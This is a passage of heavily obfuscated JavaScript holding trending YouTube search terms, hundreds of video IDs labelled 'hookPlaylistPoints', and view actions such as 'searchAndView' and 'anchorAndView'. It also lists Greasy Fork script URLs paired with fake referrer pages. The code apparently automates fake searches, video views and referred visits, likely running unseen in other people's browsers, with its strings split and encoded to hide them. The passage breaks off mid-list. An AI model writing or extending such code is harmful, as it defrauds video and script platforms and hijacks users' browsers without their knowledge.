'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xce * -0x20 + -0x18ae + 0x14 * 0x286)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x24 * -0xb3 + 0x158f + -0x2eb1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x2 * 0x1039 + -0x1 * -0x18af + -0x391e);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    Z(0x8, '(Z%&') + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    Z(0xa, '[5tY') + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    Z(0xb, 'MJnT') + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    a0(0x17) + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a1(0x16) + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0x12, 'F6eT') + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': a0(0x18) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + a0(0x14) + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0x13) + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
